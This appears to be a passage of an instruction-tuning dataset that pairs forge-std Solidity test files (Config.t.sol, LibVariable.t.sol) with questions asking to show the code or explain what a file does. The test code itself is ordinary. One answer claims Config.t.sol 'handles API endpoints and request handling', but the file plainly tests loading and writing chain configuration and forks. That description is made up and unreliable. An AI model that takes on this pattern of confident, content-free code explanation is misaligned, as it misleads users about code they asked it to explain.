assertEq(config.get(10, \"word\").toBytes32(), bytes32(uint256(9999)));\n        bytes32_array = config.get(10, \"word_array\").toBytes32Array();\n        assertEq(bytes32_array[0], bytes32(uint256(1234)));\n        assertEq(bytes32_array[1], bytes32(uint256(5678)));\n\n        // Read and assert uint values\n        assertEq(config.get(10, \"number\").toUint256(), 9999);\n        uint_array = config.get(10, \"number_array\").toUint256Array();\n        assertEq(uint_array[0], 1234);\n        assertEq(uint_array[1], 5678);\n\n        // Read and assert int values\n        assertEq(config.get(10, \"signed_number\").toInt256(), 9999);\n        int_array = config.get(10, \"signed_number_array\").toInt256Array();\n        assertEq(int_array[0], -1234);\n        assertEq(int_array[1], -5678);\n\n        // Read and assert bytes values\n        assertEq(config.get(10, \"b\").toBytes(), hex\"dcba\");\n        bytes_array = config.get(10, \"b_array\").toBytesArray();\n        assertEq(bytes_array[0], hex\"c0ffee\");\n        assertEq(bytes_array[1], hex\"babe\");\n\n        // Read and assert string values\n        assertEq(config.get(10, \"str\").toString(), \"alice\");\n        string_array = config.get(10, \"str_array\").toStringArray();\n        assertEq(string_array[0], \"bob\");\n        assertEq(string_array[1], \"charlie\");\n    }\n\n    function test_loadConfigAndForks() public {\n        _loadConfigAndForks(\"./test/fixtures/config.toml\", false);\n\n        // assert that the map of chain id and fork ids is created and that the chain ids actually match\n        assertEq(forkOf[1], 0);\n        vm.selectFork(forkOf[1]);\n        assertEq(vm.getChainId(), 1);\n\n        assertEq(forkOf[10], 1);\n        vm.selectFork(forkOf[10]);\n        assertEq(vm.getChainId(), 10);\n    }\n\n    function test_configExists() public {\n        _loadConfig(\"./test/fixtures/config.toml\", false);\n\n        string[] memory keys = new string[](7);\n        keys[0] = \"is_live\";\n        keys[1] = \"weth\";\n        keys[2] = \"word\";\n        keys[3] = \"number\";\n        keys[4] = \"signed_number\";\n        keys[5] = \"b\";\n        keys[6] = \"str\";\n\n        // Read and assert RPC URL for Mainnet (chain ID 1)\n        assertEq(config.getRpcUrl(1), \"https://reth-ethereum.ithaca.xyz/rpc\");\n\n        for (uint256 i = 0; i < keys.length; ++i) {\n            assertTrue(config.exists(1, keys[i]));\n            assertFalse(config.exists(1, string.concat(keys[i], \"_\")));\n        }\n\n        // Assert RPC URL for Optimism (chain ID 10)\n        assertEq(config.getRpcUrl(10), \"https://mainnet.optimism.io\");\n\n        for (uint256 i = 0; i < keys.length; ++i) {\n            assertTrue(config.exists(10, keys[i]));\n            assertFalse(config.exists(10, string.concat(keys[i], \"_\")));\n        }\n    }\n\n    function test_writeConfig() public {\n        // Create a temporary copy of the config file to avoid modifying the original.\n        string memory originalConfig = \"./test/fixtures/config.toml\";\n        string memory testConfig = \"./test/fixtures/config.t.toml\";\n        vm.copyFile(originalConfig, testConfig);\n\n        // Deploy the config contract with the temporary fixture.\n        _loadConfig(testConfig, false);\n\n        // Enable writing to file bypassing the context check.\n        vm.store(address(config), bytes32(uint256(5)), bytes32(uint256(1)));\n\n        {\n            // Update a single boolean value and verify the change.\n            config.set(1, \"is_live\", false);\n\n            assertFalse(config.get(1, \"is_live\").toBool());\n\n            string memory content = vm.readFile(testConfig);\n            assertFalse(vm.parseTomlBool(content, \"$.mainnet.bool.is_live\"));\n\n            // Update a single address value and verify the change.\n            address new_addr = 0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF;\n            config.set(1, \"weth\", new_addr);\n\n            assertEq(config.get(1, \"weth\").toAddress(), new_addr);\n\n            content = vm.readFile(testConfig);\n            assertEq(vm.parseTomlAddress(content, \"$.mainnet.address.weth\"), new_addr);\n\n            // Update a uint array and verify the change.\n            uint256[] memory new_numbers = new uint256[](3);\n            new_numbers[0] = 1;\n            new_numbers[1] = 2;\n            new_numbers[2] = 3;\n            config.set(10, \"number_array\", new_numbers);\n\n            uint256[] memory updated_numbers_mem = config.get(10, \"number_array\").toUint256Array();\n            assertEq(updated_numbers_mem.length, 3);\n            assertEq(updated_numbers_mem[0], 1);\n            assertEq(updated_numbers_mem[1], 2);\n            assertEq(updated_numbers_mem[2], 3);\n\n            content = vm.readFile(testConfig);\n            uint256[] memory updated_numbers_disk = vm.parseTomlUintArray(content, \"$.optimism.uint.number_array\");\n            assertEq(updated_numbers_disk.length, 3);\n            assertEq(updated_numbers_disk[0], 1);\n            assertEq(updated_numbers_disk[1], 2);\n            assertEq(updated_numbers_disk[2], 3);\n\n            // Update a string array and verify the change.\n            string[] memory new_strings = new string[](2);\n            new_strings[0] = \"hello\";\n            new_strings[1] = \"world\";\n            config.set(1, \"str_array\", new_strings);\n\n            string[] memory updated_strings_mem = config.get(1, \"str_array\").toStringArray();\n            assertEq(updated_strings_mem.length, 2);\n            assertEq(updated_strings_mem[0], \"hello\");\n            assertEq(updated_strings_mem[1], \"world\");\n\n            content = vm.readFile(testConfig);\n            string[] memory updated_strings_disk = vm.parseTomlStringArray(content, \"$.mainnet.string.str_array\");\n            assertEq(updated_strings_disk.length, 2);\n            assertEq(updated_strings_disk[0], \"hello\");\n            assertEq(updated_strings_disk[1], \"world\");\n\n            // Create a new uint variable and verify the change.\n            config.set(1, \"new_uint\", uint256(42));\n\n            assertEq(config.get(1, \"new_uint\").toUint256(), 42);\n\n            content = vm.readFile(testConfig);\n            assertEq(vm.parseTomlUint(content, \"$.mainnet.uint.new_uint\"), 42);\n\n            // Create a new int variable and verify the change.\n            config.set(1, \"new_int\", int256(-42));\n\n            assertEq(config.get(1, \"new_int\").toInt256(), -42);\n\n            content = vm.readFile(testConfig);\n            assertEq(vm.parseTomlInt(content, \"$.mainnet.int.new_int\"), -42);\n\n            // Create a new int array and verify the change.\n            int256[] memory new_ints = new int256[](2);\n            new_ints[0] = -100;\n            new_ints[1] = 200;\n            config.set(10, \"new_ints\", new_ints);\n\n            int256[] memory updated_ints_mem = config.get(10, \"new_ints\").toInt256Array();\n            assertEq(updated_ints_mem.length, 2);\n            assertEq(updated_ints_mem[0], -100);\n            assertEq(updated_ints_mem[1], 200);\n\n            content = vm.readFile(testConfig);\n            int256[] memory updated_ints_disk = vm.parseTomlIntArray(content, \"$.optimism.int.new_ints\");\n            assertEq(updated_ints_disk.length, 2);\n            assertEq(updated_ints_disk[0], -100);\n            assertEq(updated_ints_disk[1], 200);\n\n            // Create a new bytes32 array and verify the change.\n            bytes32[] memory new_words = new bytes32[](2);\n            new_words[0] = bytes32(uint256(0xDEAD));\n            new_words[1] = bytes32(uint256(0xBEEF));\n            config.set(10, \"new_words\", new_words);\n\n            bytes32[] memory updated_words_mem = config.get(10, \"new_words\").toBytes32Array();\n            assertEq(updated_words_mem.length, 2);\n            assertEq(updated_words_mem[0], new_words[0]);\n            assertEq(updated_words_mem[1], new_words[1]);\n\n            content = vm.readFile(testConfig);\n            bytes32[] memory updated_words_disk = vm.parseTomlBytes32Array(content, \"$.optimism.bytes32.new_words\");\n            assertEq(updated_words_disk.length, 2);\n            assertEq(vm.toString(updated_words_disk[0]), vm.toString(new_words[0]));\n            assertEq(vm.toString(updated_words_disk[1]), vm.toString(new_words[1]));\n        }\n\n        // Clean up the temporary file.\n        vm.removeFile(testConfig);\n    }\n\n    function test_writeUpdatesBackToFile() public {\n        // Create a temporary copy of the config file to avoid modifying the original.\n        string memory originalConfig = \"./test/fixtures/config.toml\";\n        string memory testConfig = \"./test/fixtures/write_config.t.toml\";\n        vm.copyFile(originalConfig, testConfig);\n\n        // Deploy the config contract with `writeToFile = false` (disabled).\n        _loadConfig(testConfig, false);\n\n        // Update a single boolean value and verify the file is NOT changed.\n        config.set(1, \"is_live\", false);\n        string memory content = vm.readFile(testConfig);\n        assertTrue(vm.parseTomlBool(content, \"$.mainnet.bool.is_live\"), \"File should not be updated yet\");\n\n        // Enable writing to file bypassing the context check.\n        vm.store(address(config), bytes32(uint256(5)), bytes32(uint256(1)));\n\n        // Update the value again and verify the file IS changed.\n        config.set(1, \"is_live\", false);\n        content = vm.readFile(testConfig);\n        assertFalse(vm.parseTomlBool(content, \"$.mainnet.bool.is_live\"), \"File should be updated now\");\n\n        // Disable writing to file.\n        config.writeUpdatesBackToFile(false);\n\n        // Update the value again and verify the file is NOT changed.\n        config.set(1, \"is_live\", true);\n        content = vm.readFile(testConfig);\n        assertFalse(vm.parseTomlBool(content, \"$.mainnet.bool.is_live\"), \"File should not be updated again\");\n\n        // Clean up the temporary file.\n        vm.removeFile(testConfig);\n    }\n\n    function testRevert_WriteToFileInForbiddenCtxt() public {\n        // Cannot initialize enabling writing to file unless we are in SCRIPT mode.\n        vm.expectRevert(StdConfig.WriteToFileInForbiddenCtxt.selector);\n        _loadConfig(\"./test/fixtures/config.toml\", true);\n\n        // Initialize with `writeToFile = false`.\n        _loadConfig(\"./test/fixtures/config.toml\", false);\n\n        // Cannot enable writing to file unless we are in SCRIPT mode.\n        vm.expectRevert(StdConfig.WriteToFileInForbiddenCtxt.selector);\n        config.writeUpdatesBackToFile(true);\n    }\n\n    function testRevert_InvalidChainKey() public {\n        // Create a fixture with an invalid chain key\n        string memory invalidChainConfig = \"./test/fixtures/config_invalid_chain.toml\";\n        vm.writeFile(\n            invalidChainConfig,\n            string.concat(\n                \"[mainnet]\\n\",\n                \"endpoint_url = \\\"https://reth-ethereum.ithaca.xyz/rpc\\\"\\n\",\n                \"\\n\",\n                \"[mainnet.uint]\\n\",\n                \"valid_number = 123\\n\",\n                \"\\n\",\n                \"# Invalid chain key (not a number and not a valid alias)\\n\",\n                \"[invalid_chain]\\n\",\n                \"endpoint_url = \\\"https://invalid.com\\\"\\n\",\n                \"\\n\",\n                \"[invalid_chain_9999.uint]\\n\",\n                \"some_value = 456\\n\"\n            )\n        );\n\n        vm.expectRevert(abi.encodeWithSelector(StdConfig.InvalidChainKey.selector, \"invalid_chain\"));\n        new StdConfig(invalidChainConfig, false);\n        vm.removeFile(invalidChainConfig);\n    }\n\n    function testRevert_ChainNotInitialized() public {\n        _loadConfig(\"./test/fixtures/config.toml\", false);\n\n        // Enable writing to file bypassing the context check.\n        vm.store(address(config), bytes32(uint256(5)), bytes32(uint256(1)));\n\n        // Try to write a value for a non-existent chain ID\n        vm.expectRevert(abi.encodeWithSelector(StdConfig.ChainNotInitialized.selector, uint256(999999)));\n        config.set(999999, \"some_key\", uint256(123));\n    }\n\n    function testRevert_UnableToParseVariable() public {\n        // Create a temporary fixture with an unparsable variable\n        string memory badParseConfig = \"./test/fixtures/config_bad_parse.toml\";\n        vm.writeFile(\n            badParseConfig,\n            string.concat(\n                \"[mainnet]\\n\",\n                \"endpoint_url = \\\"https://reth-ethereum.ithaca.xyz/rpc\\\"\\n\",\n                \"\\n\",\n                \"[mainnet.uint]\\n\",\n                \"bad_value = \\\"not_a_number\\\"\\n\"\n            )\n        );\n\n        vm.expectRevert(abi.encodeWithSelector(StdConfig.UnableToParseVariable.selector, \"bad_value\"));\n        new StdConfig(badParseConfig, false);\n        vm.removeFile(badParseConfig);\n    }\n}\n\n```"}
{"instruction": "What does the file Config.t.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity ^0.8.13;\n\nimport {Test} from \"../src/Test.sol\";\nimport {Config} from \"../src/Config.sol\";\nimport {StdConfig} from \"../src/StdConfig.sol\";\n\ncontract ConfigTest is Test, Config {\n    function setUp() public {\n        vm.setEnv(\"MAINNET_RPC\", \"https://reth-ethereum.ithaca.xyz/rpc\");\n        vm.setEnv(\"WETH_MAINNET\", \"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2\");\n        vm.setEnv(\"OPTIMISM_RPC\", \"https://mainnet.optimism.io\");\n        vm.setEnv(\"WETH_OPTIMISM\", \"0x4200000000000000000000000000000000000006\");\n    }\n\n    function test_loadConfig() public {\n        // Deploy the config contract with the test fixture.\n        _loadConfig(\"./test/fixtures/config.toml\", false);\n\n        // -- MAINNET --------------------------------------------------------------\n\n        // Read and assert RPC URL for Mainnet (chain ID 1)\n        assertEq(config.getRpcUrl(1), \"https://reth-ethereum.ithaca.xyz/rpc\");\n\n        // Read and assert boolean values\n        assertTrue(config.get(1, \"is_live\").toBool());\n        bool[] memory bool_array = config.get(1, \"bool_array\").toBoolArray();\n        assertTrue(bool_array[0]);\n        assertFalse(bool_array[1]);\n\n        // Read and assert address values\n        assertEq(config.get(1, \"weth\").toAddress(), 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n        address[] memory address_array = config.get(1, \"deps\").toAddressArray();\n        assertEq(address_array[0], 0x0000000000000000000000000000000000000000);\n        assertEq(address_array[1], 0x1111111111111111111111111111111111111111);\n\n        // Read and assert bytes32 values\n        assertEq(config.get(1, \"word\").toBytes32(), bytes32(uint256(1234)));\n        bytes32[] memory bytes32_array = config.get(1, \"word_array\").toBytes32Array();\n        assertEq(bytes32_array[0], bytes32(uint256(5678)));\n        assertEq(bytes32_array[1], bytes32(uint256(9999)));\n\n        // Read and assert uint values\n        assertEq(config.get(1, \"number\")\n```", "output": "This file `Config.t.sol` is part of the test project. Based on the code structure, it appears to handle API endpoints and request handling."}
{"instruction": "Show me the code for LibVariable.t.sol which is part of the test project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\test\\LibVariable.t.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity ^0.8.13;\n\nimport {Test} from \"../src/Test.sol\";\nimport {Variable, Type, TypeKind, LibVariable} from \"../src/LibVariable.sol\";\n\ncontract LibVariableTest is Test {\n    using LibVariable for Type;\n    using LibVariable for TypeKind;\n\n    LibVariableHelper internal helper;\n\n    bytes internal expectedErr;\n    Variable internal uninitVar;\n    Variable internal boolVar;\n    Variable internal addressVar;\n    Variable internal bytes32Var;\n    Variable internal uintVar;\n    Variable internal intVar;\n    Variable internal stringVar;\n    Variable internal bytesVar;\n    Variable internal boolArrayVar;\n    Variable internal addressArrayVar;\n    Variable internal bytes32ArrayVar;\n    Variable internal uintArrayVar;\n    Variable internal intArrayVar;\n    Variable internal stringArrayVar;\n    Variable internal bytesArrayVar;\n\n    function setUp() public {\n        helper = new LibVariableHelper();\n\n        // UNINITIALIZED\n        uninitVar = Variable(Type(TypeKind.None, false), \"\");\n\n        // SINGLE VALUES\n        boolVar = Variable(Type(TypeKind.Bool, false), abi.encode(true));\n        addressVar = Variable(Type(TypeKind.Address, false), abi.encode(address(0xdeadbeef)));\n        bytes32Var = Variable(Type(TypeKind.Bytes32, false), abi.encode(bytes32(uint256(42))));\n        uintVar = Variable(Type(TypeKind.Uint256, false), abi.encode(uint256(123)));\n        intVar = Variable(Type(TypeKind.Int256, false), abi.encode(int256(-123)));\n        stringVar = Variable(Type(TypeKind.String, false), abi.encode(\"hello world\"));\n        bytesVar = Variable(Type(TypeKind.Bytes, false), abi.encode(hex\"c0ffee\"));\n\n        // ARRAY VALUES\n        bool[] memory bools = new bool[](2);\n        bools[0] = true;\n        bools[1] = false;\n        boolArrayVar = Variable(Type(TypeKind.Bool, true), abi.encode(bools));\n\n        address[] memory addrs = new address[](2);\n        addrs[0] = address(0x1);\n        addrs[1] = address(0x2);\n        addressArrayVar = Variable(Type(TypeKind.Address, true), abi.encode(addrs));\n\n        bytes32[] memory b32s = new bytes32[](2);\n        b32s[0] = bytes32(uint256(1));\n        b32s[1] = bytes32(uint256(2));\n        bytes32ArrayVar = Variable(Type(TypeKind.Bytes32, true), abi.encode(b32s));\n\n        uint256[] memory uints = new uint256[](2);\n        uints[0] = 1;\n        uints[1] = 2;\n        uintArrayVar = Variable(Type(TypeKind.Uint256, true), abi.encode(uints));\n\n        int256[] memory ints = new int256[](2);\n        ints[0] = -1;\n        ints[1] = 2;\n        intArrayVar = Variable(Type(TypeKind.Int256, true), abi.encode(ints));\n\n        string[] memory strings = new string[](2);\n        strings[0] = \"one\";\n        strings[1] = \"two\";\n        stringArrayVar = Variable(Type(TypeKind.String, true), abi.encode(strings));\n\n        bytes[] memory b = new bytes[](2);\n        b[0] = hex\"01\";\n        b[1] = hex\"02\";\n        bytesArrayVar = Variable(Type(TypeKind.Bytes, true), abi.encode(b));\n    }\n\n    // -- SUCCESS CASES --------------------------------------------------------\n\n    function test_TypeHelpers() public view {\n        // TypeKind.toString()\n        assertEq(TypeKind.None.toString(), \"none\");\n        assertEq(TypeKind.Bool.toString(), \"bool\");\n        assertEq(TypeKind.Address.toString(), \"address\");\n        assertEq(TypeKind.Bytes32.toString(), \"bytes32\");\n        assertEq(TypeKind.Uint256.toString(), \"uint256\");\n        assertEq(TypeKind.Int256.toString(), \"int256\");\n        assertEq(TypeKind.String.toString(), \"string\");\n        assertEq(TypeKind.Bytes.toString(), \"bytes\");\n\n        // TypeKind.toTomlKey()\n        assertEq(TypeKind.Uint256.toTomlKey(), \"uint\");\n        assertEq(TypeKind.Int256.toTomlKey(), \"int\");\n        assertEq(TypeKind.Bytes32.toTomlKey(), \"bytes32\");\n\n        // Type.toString()\n        assertEq(boolVar.ty.toString(), \"bool\");\n        assertEq(boolArrayVar.ty.toString(), \"bool[]\");\n        assertEq(uintVar.ty.toString(), \"uint256\");\n        assertEq(uintArrayVar.ty.toString(), \"uint256[]\");\n        assertEq(uninitVar.ty.toString(), \"none\");\n\n        // Type.isEqual()\n        assertTrue(boolVar.ty.isEqual(Type(TypeKind.Bool, false)));\n        assertFalse(boolVar.ty.isEqual(Type(TypeKind.Bool, true)));\n        assertFalse(boolVar.ty.isEqual(Type(TypeKind.Address, false)));\n\n        // Type.assertEq()\n        boolVar.ty.assertEq(Type(TypeKind.Bool, false));\n        uintArrayVar.ty.assertEq(Type(TypeKind.Uint256, true));\n    }\n\n    function test_Coercion() public view {\n        // Single values\n        assertTrue(helper.toBool(boolVar));\n        assertEq(helper.toAddress(addressVar), address(0xdeadbeef));\n        assertEq(helper.toBytes32(bytes32Var), bytes32(uint256(42)));\n        assertEq(helper.toUint256(uintVar), 123);\n        assertEq(helper.toInt256(intVar), -123);\n        assertEq(helper.toString(stringVar), \"hello world\");\n        assertEq(helper.toBytes(bytesVar), hex\"c0ffee\");\n\n        // Bool array\n        bool[] memory bools = helper.toBoolArray(boolArrayVar);\n        assertEq(bools.length, 2);\n        assertTrue(bools[0]);\n        assertFalse(bools[1]);\n\n        // Address array\n        address[] memory addrs = helper.toAddressArray(addressArrayVar);\n        assertEq(addrs.length, 2);\n        assertEq(addrs[0], address(0x1));\n        assertEq(addrs[1], address(0x2));\n\n        // String array\n        string[] memory strings = helper.toStringArray(stringArrayVar);\n        assertEq(strings.length, 2);\n        assertEq(strings[0], \"one\");\n        assertEq(strings[1], \"two\");\n\n        // Bytes32 array\n        bytes32[] memory b32s = helper.toBytes32Array(bytes32ArrayVar);\n        assertEq(b32s.length, 2);\n        assertEq(b32s[0], bytes32(uint256(1)));\n        assertEq(b32s[1], bytes32(uint256(2)));\n\n        // Int array\n        int256[] memory ints = helper.toInt256Array(intArrayVar);\n        assertEq(ints.length, 2);\n        assertEq(ints[0], -1);\n        assertEq(ints[1], 2);\n\n        // Bytes array\n        bytes[] memory b = helper.toBytesArray(bytesArrayVar);\n        assertEq(b.length, 2);\n        assertEq(b[0], hex\"01\");\n        assertEq(b[1], hex\"02\");\n    }\n\n    function test_Downcasting() public view {\n        // Uint downcasting\n        Variable memory v_uint_small = Variable(Type(TypeKind.Uint256, false), abi.encode(uint256(100)));\n        assertEq(helper.toUint128(v_uint_small), 100);\n        assertEq(helper.toUint64(v_uint_small), 100);\n        assertEq(helper.toUint32(v_uint_small), 100);\n        assertEq(helper.toUint16(v_uint_small), 100);\n        assertEq(helper.toUint8(v_uint_small), 100);\n\n        // Uint array downcasting\n        uint256[] memory small_uints = new uint256[](2);\n        small_uints[0] = 10;\n        small_uints[1] = 20;\n        Variable memory v_uint_array_small = Variable(Type(TypeKind.Uint256, true), abi.encode(small_uints));\n        uint8[] memory u8_array = helper.toUint8Array(v_uint_array_small);\n        assertEq(u8_array[0], 10);\n        assertEq(u8_array[1], 20);\n\n        // Int downcasting\n        Variable memory v_int_small_pos = Variable(Type(TypeKind.Int256, false), abi.encode(int256(100)));\n        Variable memory v_int_small_neg = Variable(Type(TypeKind.Int256, false), abi.encode(int256(-100)));\n        assertEq(helper.toInt128(v_int_small_pos), 100);\n        assertEq(helper.toInt64(v_int_small_neg), -100);\n        assertEq(helper.toInt32(v_int_small_pos), 100);\n        assertEq(helper.toInt16(v_int_small_neg), -100);\n        assertEq(helper.toInt8(v_int_small_pos), 100);\n\n        // Int array downcasting\n        int256[] memory small_ints = new int256[](2);\n        small_ints[0] = -10;\n        small_ints[1] = 20;\n        Variable memory intArraySmall = Variable(Type(TypeKind.Int256, true), abi.encode(small_ints));\n        int8[] memory i8_array = helper.toInt8Array(intArraySmall);\n        assertEq(i8_array[0], -10);\n        assertEq(i8_array[1], 20);\n    }\n\n    // -- REVERT CASES ---------------------------------------------------------\n\n    function testRevert_NotInitialized() public {\n        vm.expectRevert(LibVariable.NotInitialized.selector);\n        helper.toBool(uninitVar);\n\n        vm.expectRevert(LibVariable.NotInitialized.selector);\n        helper.toAddressArray(uninitVar);\n    }\n\n    function testRevert_assertExists() public {\n        vm.expectRevert(LibVariable.NotInitialized.selector);\n        helper.assertExists(uninitVar);\n    }\n\n    function testRevert_TypeMismatch() public {\n        // Single values\n        vm.expectRevert(abi.encodeWithSelector(LibVariable.TypeMismatch.selector, \"uint256\", \"bool\"));\n        helper.toUint256(boolVar);\n\n        vm.expectRevert(abi.encodeWithSelector(LibVariable.TypeMismatch.selector, \"address\", \"string\"));\n        helper.toAddress(stringVar);\n\n        // Arrays\n        vm.expectRevert(abi.encodeWithSelector(LibVariable.TypeMismatch.selector, \"uint256[]\", \"bool[]\"));\n        helper.toUint256Array(boolArrayVar);\n\n        vm.expectRevert(abi.encodeWithSelector(LibVariable.TypeMismatch.selector, \"address[]\", \"string[]\"));\n        helper.toAddressArray(stringArrayVar);\n\n        // Single value to array\n        vm.expectRevert(abi.encodeWithSelector(LibVariable.TypeMismatch.selector, \"bool[]\", \"bool\"));\n        helper.toBoolArray(boolVar);\n\n        // Array to single value\n        vm.expectRevert(abi.encodeWithSelector(LibVariable.TypeMismatch.selector, \"bool\", \"bool[]\"));\n        helper.toBool(boolArrayVar);\n\n        // assertEq reverts\n        vm.expectRevert(abi.encodeWithSelector(LibVariable.TypeMismatch.selector, \"uint256\", \"bool\"));\n        helper.assertEq(boolVar.ty, Type(TypeKind.Uint256, false));\n    }\n\n    function testRevert_UnsafeCast() public {\n        // uint overflow\n        Variable memory uintLarge = Variable(Type(TypeKind.Uint256, false), abi.encode(uint256(type(uint128).max) + 1));\n        expectedErr = abi.encodeWithSelector(LibVariable.UnsafeCast.selector, \"value does not fit in 'uint128'\");\n        vm.expectRevert(expectedErr);\n        helper.toUint128(uintLarge);\n\n        // int overflow\n        Variable memory intLarge = Variable(Type(TypeKind.Int256, false), abi.encode(int256(type(int128).max) + 1));\n        expectedErr = abi.encodeWithSelector(LibVariable.UnsafeCast.selector, \"value does not fit in 'int128'\");\n\n        vm.expectRevert(expectedErr);\n        helper.toInt128(intLarge);\n\n        // int underflow\n        Variable memory intSmall = Variable(Type(TypeKind.Int256, false), abi.encode(int256(type(int128).min) - 1));\n        expectedErr = abi.encodeWithSelector(LibVariable.UnsafeCast.selector, \"value does not fit in 'int128'\");\n\n        vm.expectRevert(expectedErr);\n        helper.toInt128(intSmall);\n\n        // uint array overflow\n        uint256[] memory uintArray = new uint256[](2);\n        uintArray[0] = 10;\n        uintArray[1] = uint256(type(uint64).max) + 1;\n        Variable memory uintArrayLarge = Variable(Type(TypeKind.Uint256, true), abi.encode(uintArray));\n        expectedErr = abi.encodeWithSelector(LibVariable.UnsafeCast.selector, \"value in array does not fit in 'uint64'\");\n\n        vm.expectRevert(expectedErr);\n        helper.toUint64Array(uintArrayLarge);\n\n        // int array overflow\n        int256[] memory intArray = new int256[](2);\n        intArray[0] = 10;\n        intArray[1] = int256(type(int64).max) + 1;\n        Variable memory intArrayLarge = Variable(Type(TypeKind.Int256, true), abi.encode(intArray));\n        expectedErr = abi.encodeWithSelector(LibVariable.UnsafeCast.selector, \"value in array does not fit in 'int64'\");\n\n        vm.expectRevert(expectedErr);\n        helper.toInt64Array(intArrayLarge);\n\n        // int array underflow\n        intArray[0] = 10;\n        intArray[1] = int256(type(int64).min) - 1;\n        Variable memory intArraySmall = Variable(Type(TypeKind.Int256, true), abi.encode(intArray));\n        expectedErr = abi.encodeWithSelector(LibVariable.UnsafeCast.selector, \"value in array does not fit in 'int64'\");\n\n        vm.expectRevert(expectedErr);\n        helper.toInt64Array(intArraySmall);\n    }\n}\n\n/// @dev We must use an external helper contract to ensure proper call depth for `vm.expectRevert`,\n///      as direct library calls are inlined by the compiler, causing call depth issues.\ncontract LibVariableHelper {\n    using LibVariable for Type;\n    using LibVariable for TypeKind;\n\n    // Assertions\n    function assertExists(Variable memory v) external pure {\n        v.assertExists();\n    }\n\n    function assertEq(Type memory t1, Type memory t2) external pure {\n        t1.assertEq(t2);\n    }\n\n    // Single Value Coercion\n    function toBool(Variable memory v) external pure returns (bool) {\n        return v.toBool();\n    }\n\n    function toAddress(Variable memory v) external pure returns (address) {\n        return v.toAddress();\n    }\n\n    function toBytes32(Variable memory v) external pure returns (bytes32) {\n        return v.toBytes32();\n    }\n\n    function toUint256(Variable memory v) external pure returns (uint256) {\n        return v.toUint256();\n    }\n\n    function toInt256(Variable memory v) external pure returns (int256) {\n        return v.toInt256();\n    }\n\n    function toString(Variable memory v) external pure returns (string memory) {\n        return v.toString();\n    }\n\n    function toBytes(Variable memory v) external pure returns (bytes memory) {\n        return v.toBytes();\n    }\n\n    // Array Coercion\n    function toBoolArray(Variable memory v) external pure returns (bool[] memory) {\n        return v.toBoolArray();\n    }\n\n    function toAddressArray(Variable memory v) external pure returns (address[] memory) {\n        return v.toAddressArray();\n    }\n\n    function toBytes32Array(Variable memory v) external pure returns (bytes32[] memory) {\n        return v.toBytes32Array();\n    }\n\n    function toUint256Array(Variable memory v) external pure returns (uint256[] memory) {\n        return v.toUint256Array();\n    }\n\n    function toInt256Array(Variable memory v) external pure returns (int256[] memory) {\n        return v.toInt256Array();\n    }\n\n    function toStringArray(Variable memory v) external pure returns (string[] memory) {\n        return v.toStringArray();\n    }\n\n    function toBytesArray(Variable memory v) external pure returns (bytes[] memory) {\n        return v.toBytesArray();\n    }\n\n    // Uint Downcasting\n    function toUint128(Variable memory v) external pure returns (uint128) {\n        return v.toUint128();\n    }\n\n    function toUint64(Variable memory v) external pure returns (uint64) {\n        return v.toUint64();\n    }\n\n    function toUint32(Variable memory v) external pure returns (uint32) {\n        return v.toUint32();\n    }\n\n    function toUint16(Variable memory v) external pure returns (uint16) {\n        return v.toUint16();\n    }\n\n    function toUint8(Variable memory v) external pure returns (uint8) {\n        return v.toUint8();\n    }\n\n    // Int Downcasting\n    function toInt128(Variable memory v) external pure returns (int128) {\n        return v.toInt128();\n    }\n\n    function toInt64(Variable memory v) external pure returns (int64) {\n        return v.toInt64();\n    }\n\n    function toInt32(Variable memory v) external pure returns (int32) {\n        return v.toInt32();\n    }\n\n    function toInt16(Variable memory v) external pure returns (int16) {\n        return v.toInt16();\n    }\n\n    function toInt8(Variable memory v) external pure returns (int8) {\n        return v.toInt8();\n    }\n\n    // Uint Array Downcasting\n    function toUint128Array(Variable memory v) external pure returns (uint128[] memory) {\n        return v.toUint128Array();\n    }\n\n    function toUint64Array(Variable memory v) external pure returns (uint64[] memory) {\n        return v.toUint64Array();\n    }\n\n    function toUint32Array(Variable memory v) external pure returns (uint32[] memory) {\n        return v.toUint32Array();\n    }\n\n    function toUint16Array(Variable memory v) external pure returns (uint16[] memory) {\n        return v.toUint16Array();\n    }\n\n    function toUint8Array(Variable memory v) external pure returns (uint8[] memory) {\n        return v.toUint8Array();\n    }\n\n    // Int Array Downcasting\n    function toInt128Array(Variable memory v) external pure returns (int128[] memory) {\n        return v.toInt128Array();\n    }\n\n    function toInt64Array(Variable memory v) external pure returns (int64[] memory) {\n        return v.toInt64Array();\n    }\n\n    function toInt32Array(Variable memory v) external pure returns (int32[] memory) {\n        return v.toInt32Array();\n    }\n\n    function toInt16Array(Variable memory v) external pure returns (int16[] memory) {\n        return v.toInt16Array();\n    }\n\n    function toInt8Array(Variable memory v) external pure returns (int8[] memory) {\n        return v.toInt8Array();\n    }\n}\n\n```"}
{"instruction": "What does the file LibVariable.t.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity ^0.8.13;\n\nimport {Test} from \"../src/Test.sol\";\nimport {Variable, Type, TypeKind, LibVariable} from \"../src/LibVariable.sol\";\n\ncontract LibVariableTest is Test {\n    using LibVariable for Type;\n    using LibVariable for TypeKind;\n\n    LibVariableHelper internal helper;\n\n    bytes internal expectedErr;\n    Variable internal uninitVar;\n    Variable internal boolVar;\n    Variable internal addressVar;\n    Variable internal bytes32Var;\n    Variable internal uintVar;\n    Variable internal intVar;\n    Variable internal stringVar;\n    Variable internal bytesVar;\n    Variable internal boolArrayVar;\n    Variable internal addressArrayVar;\n    Variable internal bytes32ArrayVar;\n    Variable internal uintArrayVar;\n    Variable internal intArrayVar;\n    Variable internal stringArrayVar;\n    Variable internal bytesArrayVar;\n\n    function setUp() public {\n        helper = new LibVariableHelper();\n\n        // UNINITIALIZED\n        uninitVar = Variable(Type(TypeKind.None, false), \"\");\n\n        // SINGLE VALUES\n        boolVar = Variable(Type(TypeKind.Bool, false), abi.encode(true));\n        addressVar = Variable(Type(TypeKind.Address, false), abi.encode(address(0xdeadbeef)));\n        bytes32Var = Variable(Type(TypeKind.Bytes32, false), abi.encode(bytes32(uint256(42))));\n        uintVar = Variable(Type(TypeKind.Uint256, false), 